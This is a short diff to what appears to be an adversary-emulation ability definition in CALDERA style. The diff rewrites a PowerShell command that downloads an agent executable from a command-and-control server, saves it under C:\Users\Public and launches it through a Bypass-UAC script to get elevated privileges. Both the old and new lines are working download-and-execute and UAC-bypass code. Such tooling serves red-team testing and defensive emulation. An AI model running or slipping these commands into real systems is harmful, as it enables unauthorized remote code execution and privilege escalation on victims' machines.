@@ -11,7 +11,7 @@
     windows:
       psh:
         command: |
-          $url="#{server}/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $wc.Headers.add("defaultServer","#{server}"); $output="C:\Users\Public\sandcat1.exe";$wc.DownloadFile($url,$output);
-          $job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\sandcat1.exe -group #{group}"; };
+          $url="#{server}/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);
+          $job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group #{group}"; };
           Receive-Job -Job $job -Wait;
         payload: Bypass-UAC.ps1
